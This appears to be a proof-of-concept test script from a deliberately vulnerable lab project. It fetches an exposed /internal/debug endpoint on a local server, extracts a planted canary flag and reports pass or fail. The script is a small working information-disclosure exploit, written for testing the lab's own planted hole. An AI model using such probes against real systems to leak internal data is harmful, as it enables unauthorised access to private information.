#!/usr/bin/env node
/**
 * PoC V1.3 — leak canary flag from /internal/debug when EXPOSE_DEBUG=true.
 * Usage: node debug-leak.mjs --base http://127.0.0.1:3001
 */
import { extractFlag } from '../../../packages/shared/dist/index.js';

function arg(name, fallback) {
  const i = process.argv.indexOf(`--${name}`);
  return i >= 0 ? process.argv[i + 1] : fallback;
}

const base = arg('base', 'http://127.0.0.1:3001').replace(/\/$/, '');
const res = await fetch(`${base}/internal/debug`);
const text = await res.text();
console.log('status', res.status);
console.log(text);

const flag = extractFlag(text);
if (!flag || res.status !== 200) {
  console.error('FAIL: debug canary not obtained');
  process.exit(1);
}
console.log('FLAG', flag);
console.log('PASS V1.3 debug-leak');
